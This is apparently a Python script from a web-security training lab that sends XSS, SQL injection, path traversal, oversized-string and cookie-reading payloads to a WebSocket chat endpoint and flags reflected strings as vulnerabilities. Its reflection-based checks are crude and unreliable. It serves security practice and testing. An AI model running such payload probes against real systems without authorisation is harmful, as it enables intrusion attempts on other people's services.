import asyncio
import websockets

# List of payloads to test various WebSocket vulnerabilities
payloads = [
    '{"message": "test_payload"}',                             # Basic test payload
    '{"message": "<img src=1 onerror=\'alert(1)\'>"}',         # XSS payload
    '{"message": "\' OR 1=1 --"}',                             # SQL Injection payload
    '{"message": "../../../../etc/passwd"}',                   # Directory Traversal payload
    '{"message": "' + "A" * 1000 + '"}',                       # Buffer Overflow payload
    '{"message": "<script>console.log(document.cookie)</script>"}',  # Script injection
    '{"message": "{\"username\": \"admin\"}"}',                # JSON Injection
    '{"message": "<svg/onload=alert(1)>"}',                    # Another XSS payload
]

async def send_payload(websocket, payload):
    try:
        await websocket.send(payload)
        response = await websocket.recv()
        return response
    except Exception as e:
        print(f"Error sending payload: {e}")
        return None

async def analyze_response(response):
    # Simple analysis to detect if any vulnerability is triggered
    if "<img src=1 onerror='alert(1)'>" in response or "alert(1)" in response:
        print("Potential XSS vulnerability detected!")
    elif "' OR 1=1 --" in response:
        print("Potential SQL Injection vulnerability detected!")
    elif "/etc/passwd" in response:
        print("Potential Directory Traversal vulnerability detected!")
    elif "A" * 1000 in response:
        print("Potential Buffer Overflow vulnerability detected!")
    elif "console.log(document.cookie)" in response:
        print("Potential Script Injection detected!")
    elif "{\"username\": \"admin\"}" in response:
        print("Potential JSON Injection detected!")
    elif "<svg/onload=alert(1)>" in response:
        print("Potential XSS vulnerability detected!")
    # Add more sophisticated analysis as needed

async def test_websocket(url):
    try:
        async with websockets.connect(url) as websocket:
            for payload in payloads:
                response = await send_payload(websocket, payload)
                if response:
                    print(f"Sent: {payload}")
                    print(f"Received: {response}")
                    await analyze_response(response)
                await asyncio.sleep(1)  # Short delay between payloads
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    url = "wss://0af2009a03e2320381f1bbdc004e0058.web-security-academy.net/chat"  # Replace with the target WebSocket URL
    asyncio.run(test_websocket(url))
